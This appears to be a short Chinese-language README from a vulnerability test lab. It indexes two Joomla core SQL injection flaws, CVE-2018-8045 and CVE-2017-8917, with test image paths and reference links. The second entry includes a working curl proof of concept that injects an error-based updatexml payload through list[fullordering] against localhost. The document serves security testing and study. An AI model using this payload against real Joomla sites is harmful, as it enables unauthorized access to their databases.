## CVE-2018-8045 - 后台 `filter[category_id]` SQL 注入漏洞

测试镜像

* src/joomla/3.8.3/

参考链接

* [【漏洞分析】Joomla内核SQL注入漏洞（CVE-2018-8045）分析](http://blog.nsfocus.net/cve-2018-804-analysis/)

## CVE-2017-8917 - com_fields fullordering 注入

测试镜像

* src/joomla/3.7.0/

参考链接

* [Joomla! 3.7 Core SQL Injection (CVE-2017-8917)](https://www.seebug.org/vuldb/ssvid-93113)
* [XiphosResearch/exploits - Joomblah/joomblah.py](https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py)

Poc

```
curl -g '127.0.0.1/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(2,concat(0x7e,(version())),0)' | grep XPATH
```

